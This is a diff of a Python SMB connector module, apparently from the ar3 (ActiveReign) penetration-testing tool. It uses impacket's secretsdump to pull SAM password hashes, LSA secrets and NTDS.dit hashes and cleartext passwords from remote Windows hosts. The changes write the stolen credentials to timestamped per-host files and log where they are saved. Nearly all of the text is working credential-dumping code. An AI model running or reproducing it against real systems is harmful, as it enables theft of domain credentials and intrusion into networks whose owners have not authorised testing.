@@ -10,10 +10,11 @@ from impacket.smbconnection import SMBConnection, SessionError
 from impacket.dcerpc.v5.transport import DCERPCTransportFactory
 from impacket.examples.secretsdump import RemoteOperations, SAMHashes, NTDSHashes, LSASecrets
 
+from ar3.logger import highlight
 from ar3.helpers import remotefile
 from ar3.core.connector import Connector
 from ar3.ops.enum.polenum import SAMRDump
-from ar3.helpers.misc import validate_ntlm
+from ar3.helpers.misc import validate_ntlm, get_filestamp
 
 class SmbCon(Connector):
     def __init__(self, args, loggers, host, db):
@@ -35,9 +36,8 @@ class SmbCon(Connector):
     # Session Management
     #########################
     def create_smb_con(self):
-        # @TODO refactor
+        # @TODO refactor, called by spider & file search to create con
         if self.smb_connection():
-            self.host_info()
             try:
                 self.login()
             except Exception as e:
@@ -248,17 +248,23 @@ class SmbCon(Connector):
             add_sam_hash.added_to_db += 1
 
         try:
+            # Output File
+            file_name = '{}_{}'.format(self.host.lower(), get_filestamp())
+            outfile = os.path.join(os.path.expanduser('~'), '.ar3', 'workspaces', self.args.workspace, file_name)
+
             add_sam_hash.added_to_db = 0
             self.enable_remoteops()
             if self.remote_ops and self.bootkey:
                 SAMFileName = self.remote_ops.saveSAM()
                 SAM = SAMHashes(SAMFileName, self.bootkey, isRemote=True, perSecretCallback=lambda secret: add_sam_hash(secret, self.host))
                 SAM.dump()
+                SAM.export(outfile)
         except Exception as e:
             self.logger.debug('SAM Extraction Failed for {}: {}'.format(self.host, str(e)))
 
         if add_sam_hash.added_to_db > 0:
-            self.logger.success([self.host, self.ip, "SAM HASH", '{} NTLM hashes added to the database'.format(add_sam_hash.added_to_db)])
+            self.logger.success([self.host, self.ip, "SAM HASH", '{} hashes added to the database'.format(add_sam_hash.added_to_db)])
+            self.logger.info([self.host, self.ip, "SAM HASH", 'Output saved to: {}.sam'.format(outfile)])
 
         try:
             self.remote_ops.finish()
@@ -273,7 +279,10 @@ class SmbCon(Connector):
                 add_lsa_secret.secrets += 1
 
         try:
-            outfile = os.path.join(os.path.expanduser('~'), '.ar3', 'workspaces', self.args.workspace, self.domain)
+            # Output File
+            file_name = '{}_{}'.format(self.host.lower(), get_filestamp())
+            outfile = os.path.join(os.path.expanduser('~'), '.ar3', 'workspaces', self.args.workspace, file_name)
+            # Dump
             add_lsa_secret.secrets = 0
             self.enable_remoteops()
             if self.remote_ops and self.bootkey:
@@ -285,6 +294,9 @@ class SmbCon(Connector):
                 LSA.exportSecrets(outfile)
         except Exception as e:
             self.logger.debug('LSA Extraction Failed for {}: {}'.format(self.host, str(e)))
+
+        if add_lsa_secret.secrets > 0:
+            self.logger.info([self.host, self.ip, "LSA SECRET", 'Output saved to: {}.secrets'.format(outfile)])
 
         try:
             self.remote_ops.finish()
@@ -330,7 +342,9 @@ class SmbCon(Connector):
             add_ntds_hash.ntds_hashes = 0
             add_ntds_hash.clear_text = 0
             add_ntds_hash.added_to_db = 0
-            outfile = os.path.join(os.path.expanduser('~'), '.ar3', 'workspaces', self.args.workspace, self.domain)
+            # Output File
+            file_name = '{}_{}'.format(self.host.lower(), get_filestamp())
+            outfile = os.path.join(os.path.expanduser('~'), '.ar3', 'workspaces', self.args.workspace, file_name)
 
             if self.remote_ops and self.bootkey:
                 if self.args.ntds is 'vss':
@@ -346,7 +360,7 @@ class SmbCon(Connector):
                 self.logger.info([self.host, self.ip, "NTDS", 'Dumping NTDS.dit, this could take a minute'])
                 NTDS.dump()
 
-                self.logger.success([self.host, self.ip, "NTDS", '{} NTLM hashes and {} clear text passwords collected'.format(add_ntds_hash.ntds_hashes, add_ntds_hash.clear_text)])
+                self.logger.success([self.host, self.ip, "NTDS", '{} hashes and {} passwords collected'.format(add_ntds_hash.ntds_hashes, add_ntds_hash.clear_text)])
                 self.logger.success([self.host, self.ip, "NTDS", '{} creds added to the database'.format(add_ntds_hash.added_to_db)])
                 self.logger.info([self.host, self.ip, "NTDS", 'Hash files located at: {}'.format(outfile)])
 
